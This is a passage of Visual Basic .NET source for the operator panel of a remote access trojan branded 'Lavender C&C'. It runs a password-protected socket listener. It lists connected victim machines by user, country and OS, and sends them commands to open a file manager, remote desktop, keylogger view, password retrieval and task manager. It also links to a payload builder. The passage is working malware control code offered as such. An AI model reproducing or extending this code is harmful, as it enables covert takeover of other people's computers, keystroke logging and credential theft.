            cidf = cfr & Path.DirectorySeparatorChar & "hosts" & Path.DirectorySeparatorChar & cid
            Try
                Dim di As New DirectoryInfo(cidf)
                If Not di.Exists Then
                    di.Create()
                End If
            Catch ex As Exception
                MsgBox("Hosts/current subfolder could not be created!" & vbNewLine & ex.Message)
            End Try
        Else
            Tabs.Enabled = False
            Tabs.Visible = False
        End If
    End Sub

    Private Sub FileButton_Click(sender As Object, e As EventArgs) Handles FileButton.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "|||") ' file manager
        Next
    End Sub

    Private Sub RemoteButton_Click(sender As Object, e As EventArgs) Handles RemoteButton.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "!")
        Next
    End Sub

    Private Sub ShowKeyloggerButton_Click(sender As Object, e As EventArgs) Handles ShowKeyloggerButton.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "openlo")
        Next
    End Sub

    Private Sub PasswordsButton_Click(sender As Object, e As EventArgs) Handles PasswordsButton.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "++")
        Next
    End Sub

    Private Sub UtilitiesButton_Click(sender As Object, e As EventArgs) Handles UtilitiesButton.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "util")
        Next
    End Sub



    Private Sub ExitButton_Click(sender As Object, e As EventArgs) Handles ExitButton.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "close")
        Next
    End Sub

    Private Sub UninstallButton_Click(sender As Object, e As EventArgs) Handles UninstallButton.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "Uninstall")
        Next
    End Sub

    Private Sub ListenButton_Click(sender As Object, e As EventArgs) Handles ListenButton.Click
        PasswordTextbox.BackColor = Color.Black
        If PasswordTextbox.Text.Length = 0 Then
            ErrorLabel.Text = "No Password!"
            PasswordTextbox.Focus()
            PasswordTextbox.BackColor = Color.DarkRed
            Return
        End If
        If ListenButton.Text = "Start" Then
            pw = PasswordTextbox.Text
            Try
                S = New SocketServer
                S.Start(PortValue.Value)
                Spinner.Visible = True
                ListenButton.Text = "Stop"
                ListenButton.BackColor = Color.Red
                PasswordTextbox.Enabled = False
                PortValue.Enabled = False
                ErrorLabel.Text = Nothing
                InfoLabel.Text = "Listener started"
                My.Settings.Port = PortValue.Value
            Catch ex As Exception
                ErrorLabel.Text = "Socket start error"
                MsgBox(ex.Message.ToString & Environment.NewLine & ex.StackTrace.ToString, MsgBoxStyle.Critical, "Error")
            End Try
        Else
            For Each x As ListViewItem In L1.Items
                S.Disconnect(x.ToolTipText)
            Next
            S.stops()
            Spinner.Visible = False
            ListenButton.Text = "Start"
            ListenButton.BackColor = Color.Green
            PasswordTextbox.Enabled = True
            PortValue.Enabled = True
        End If

    End Sub


    Private Sub ExitToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ExitToolStripMenuItem.Click
        End
    End Sub

    Private Sub TrayIcon_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles TrayIcon.MouseDoubleClick
        ShowIcon = True
        ShowInTaskbar = True
        Me.Show()
        Me.BringToFront()
    End Sub

    Private Sub SdfghToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SdfghToolStripMenuItem.Click
        ShowIcon = True
        ShowInTaskbar = True
        Me.Show()
        Me.BringToFront()
    End Sub

    Private Sub Main_Resize(sender As Object, e As EventArgs) Handles MyBase.Resize
        If WindowState = FormWindowState.Minimized Then
            Me.Hide()
            ''ShowIcon = False
            ShowInTaskbar = False
            TrayIcon.Visible = True
            TrayIcon.BalloonTipIcon = ToolTipIcon.Info
            TrayIcon.BalloonTipTitle = "Lavender C&C"
            TrayIcon.BalloonTipText = "Servers online: [x]".Replace("x", L1.Items.Count)
            TrayIcon.ShowBalloonTip(1000)
        Else
            ''TrayIcon.Visible = False
        End If
    End Sub

    Private Sub InfoTimer_Tick(sender As Object, e As EventArgs) Handles InfoTimer.Tick
        Try
            For Each x As ListViewItem In L1.Items
                If Integer.TryParse(x.ToolTipText, 0) = True Then
                    S.Send(Integer.Parse(x.ToolTipText), "info" & Sep.ToString & pw.ToString)
                End If
            Next
            If infotimeout = 0 Then
                InfoLabel.Text = Nothing
            Else
                infotimeout -= 1
            End If
        Catch ex As Exception
            MsgBox(ex.Message & vbNewLine & ex.StackTrace) ''TODO: REMOVE!
        End Try

    End Sub

    Private Sub InfoLabel_TextChanged(sender As Object, e As EventArgs) Handles InfoLabel.TextChanged
        infotimeout = 1
    End Sub

    Private Sub HelpButton_Click(sender As Object, e As EventArgs) Handles AboutButton.Click
        About.Show()
    End Sub

    Private Sub BuilderButton_Click(sender As Object, e As EventArgs) Handles BuilderButton.Click
        Builder.Show()
    End Sub

    Private Sub KeysButton_Click(sender As Object, e As EventArgs) Handles KeysButton.Click
        Profiles.Show()
    End Sub

    Private Sub ShowPasswordButton_MouseDown(sender As Object, e As MouseEventArgs) Handles ShowPasswordButton.MouseDown
        PasswordTextbox.UseSystemPasswordChar = False
    End Sub

    Private Sub ShowPasswordButton_MouseUp(sender As Object, e As MouseEventArgs) Handles ShowPasswordButton.MouseUp
        PasswordTextbox.UseSystemPasswordChar = True
    End Sub

    Private Sub TaskmanButton_Click(sender As Object, e As EventArgs) Handles TaskmanButton.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "||||")
        Next
    End Sub

    Private Sub CopyToClipboardToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyToClipboardToolStripMenuItem.Click
        Dim ars As Integer = 0
        For Each x As ListViewItem In L1.SelectedItems
            ars += 6
        Next
        Dim s(ars - 1) As String
        Dim i As Integer = 0
        For Each x As ListViewItem In L1.SelectedItems
            s(i) = "===" & x.SubItems.Item(1).Text & "==="
            s(i + 1) = "ID: " & x.SubItems.Item(0).Text
            s(i + 2) = "Computer/User: " & x.SubItems.Item(2).Text
            s(i + 3) = "Country: " & x.SubItems.Item(3).Text
            s(i + 4) = "OS: " & x.SubItems.Item(4).Text
            s(i + 5) = "====================="
            ''TODO FINISH
            i += 6
        Next
        If i > 0 Then
            Dim zi As String = ""
            For Each z As String In s
                zi += z & vbNewLine
            Next
            Clipboard.SetText(zi)
        End If
        
    End Sub

    Private Sub RetrieveButton_Click(sender As Object, e As EventArgs)
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "specs")
        Next
    End Sub

    Private Sub Tabs_SelectedIndexChanged(sender As Object, e As EventArgs) Handles Tabs.SelectedIndexChanged
        Tabs.SelectedTab.Refresh()
    End Sub

    Private Sub ReconnectButton_Click(sender As Object, e As EventArgs) Handles ReconnectButton.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "reconnect")
        Next
    End Sub
End Class
